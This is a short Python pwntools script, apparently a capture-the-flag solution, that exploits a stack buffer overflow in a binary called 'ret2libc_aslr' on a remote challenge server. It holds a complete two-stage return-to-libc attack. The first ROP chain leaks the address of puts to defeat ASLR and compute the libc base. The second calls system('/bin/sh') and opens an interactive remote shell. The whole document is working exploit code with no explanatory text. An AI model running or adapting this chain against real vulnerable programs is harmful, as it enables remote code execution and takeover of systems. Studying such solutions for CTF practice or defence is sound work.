#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET_TO_RIP = 72

POP_RDI   = elf.symbols['pop_rdi_ret']
RET       = 0x000000000040101a
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']
EXIT = libc.symbols["exit"]

binsh_offset = next(libc.search(b"/bin/sh"))
#print(binsh_offset)



#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13523)

# -------- Stage 1: leak puts --------
p.recvuntil(b'wish: ')
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(MAIN),
)
p.sendline(stage1)
p.recvline()                        # consume "Let me check..."

leaked = p.recvline().strip()
#print(leaked)
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")

libc_base = leak_puts - libc.symbols['puts']
log.info(f"libc base = {libc_base:#x}")


# -------- Stage 2: system("/bin/sh") --------
binsh  = libc_base + binsh_offset
system = libc_base +  libc.symbols['system']
p.recvuntil(b'wish: ')
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    RET, 
    POP_RDI,
    p64(binsh), 
    p64(system),  
    RET, 
)
p.sendline(stage2)
p.interactive()

